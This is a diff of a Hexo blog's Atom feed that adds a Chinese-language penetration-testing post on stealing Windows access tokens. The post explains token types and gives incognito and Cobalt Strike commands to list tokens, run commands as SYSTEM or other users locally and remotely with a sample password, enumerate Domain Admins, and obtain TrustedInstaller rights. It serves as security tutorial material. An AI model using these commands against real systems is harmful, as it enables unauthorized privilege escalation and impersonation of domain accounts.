@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://github.com/"/>
-  <updated>2020-04-26T01:37:49.040Z</updated>
+  <updated>2020-04-26T02:48:39.678Z</updated>
   <id>https://github.com/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>incognito Stealing Windows Access Tokens</title>
+    <link href="https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/"/>
+    <id>https://github.com/2020/04/26/incognito-Stealing-Windows-Access-Tokens/</id>
+    <published>2020-04-26T02:18:58.000Z</published>
+    <updated>2020-04-26T02:48:39.678Z</updated>
+    
+    <content type="html"><![CDATA[<p>使用incognito可以窃取令牌以任意用户身份执行任意命令或payload</p><p>得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌<br>列出域管理组成员：</p><pre><code>net groups &quot;Domain Admins&quot; /domain</code></pre><p><strong>0x01、ACCESS TOKEN(访问令牌)：</strong></p><p>当用户登录时，Windows会为此用户创建访问令牌，用于存储用户的身份和特权</p><p>Token在用户创建进程或者线程时会被使用，那么这些进程或者线程能够访问哪些资源取决于当前令牌</p><p><strong>0x02、令牌类型</strong></p><p>Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)</p><p>Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)</p><p>这两种令牌,都会在系统重启以后被清除, 否则将会一直驻留在内存中,而授权令牌则会在用户注销以后自动被转为模拟令牌,但仍然可利用。</p><p><strong>0x03、本地和远程的基本用法</strong></p><p><strong>本地：</strong> </p><p>查看 token：</p><p><code>incognito.exe list_tokens–u</code> </p><p>获取到已注销用户 int18\administrator的token,盗取token 执行命令： </p><pre><code>incognito.exe execute -c &quot;int18\administrator&quot; calc.exe </code></pre><p><strong>远程：</strong></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  list_tokens -u</code></pre><p><img src="1.png" alt=""></p><pre><code>incognito -h 10.101.112.213 -u employee2012\administrator -p abc@123  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe </code></pre><p><img src="2.png" alt=""></p><p><strong>0x04、提权、降权、伪造（以本地示例)</strong></p><pre><code>incognito execute -c &quot;NT AUTHORITYSYSTEM&quot; cmd.exe #提权至system incognito execute -c &quot;int\test&quot; cmd.exe #降权至当前 test 用户 incognito execute -c &quot;int\test1&quot; cmd.exe #伪造test1 用户 </code></pre><p>0x03、获取TrustedInstaller 权限（修改系统文件）<br>管理员、System 均无法修改系统文件、需 TrustedInstaller 权限<br><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">借用 TrustedInstaller.exe 的 token 创建子进程，这样子进程就有了 TrustedInstaller 权限</a></p><p>在CS下获取TrustedInstaller </p><blockquote><p>shell sc strat TrustedInstaller </p></blockquote><blockquote><p>steal token  1700 ##ps查看TrustedInstaller进程号</p></blockquote><blockquote><p>shell whoami /groups</p></blockquote><p>链接：</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/</a></p><p><a href="https://blog.csdn.net/qq_36374896/article/details/84261516" target="_blank" rel="noopener">https://blog.csdn.net/qq_36374896/article/details/84261516</a>  </p><p><a href="https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html" target="_blank" rel="noopener">https://tyranidslair.blogspot.nl/2017/08/the-art-of-becoming-trustedinstaller.html</a> </p><p><a href="https://www.jianshu.com/p/907c6aab6fd0" target="_blank" rel="noopener">https://www.jianshu.com/p/907c6aab6fd0</a></p><p><a href="http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf" target="_blank" rel="noopener">http://paper.vulsee.com/Micro8/%E7%AC%AC%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E8%AF%BE%EF%BC%9A%E7%AA%83%E5%8F%96%2C%E4%BC%AA%E9%80%A0%E6%A8%A1%E6%8B%9F%E5%90%84%E7%A7%8Dwindows%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%5Btoken%E5%88%A9%E7%94%A8%5D.pdf</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;使用incognito可以窃取令牌以任意用户身份执行任意命令或payload&lt;/p&gt;
+&lt;p&gt;得到当前管理员权限，域管理员帐户已登录到该计算机，则可能可以简单地从中读取域管理员的访问令牌&lt;br&gt;列出域管理组成员：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;net groups &amp;quot
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>域渗透之AD Recyle Bin组利用+Ldaps信息枚举</title>
